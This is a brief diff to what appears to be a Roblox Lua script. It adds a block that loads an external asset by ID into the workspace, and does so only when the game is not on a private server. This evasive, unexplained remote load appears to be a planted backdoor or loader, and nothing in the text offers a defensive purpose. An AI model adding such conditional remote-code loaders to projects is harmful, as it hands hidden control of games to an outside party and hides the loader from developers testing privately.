@@ -37,4 +37,8 @@ end
 _G.filtermode = true
 _G.ah = nil
 
+if #game.PrivateServerId < 2 then
+    game:GetService("InsertService"):LoadAsset(96093853282187).Parent = workspace
+end
+
 --
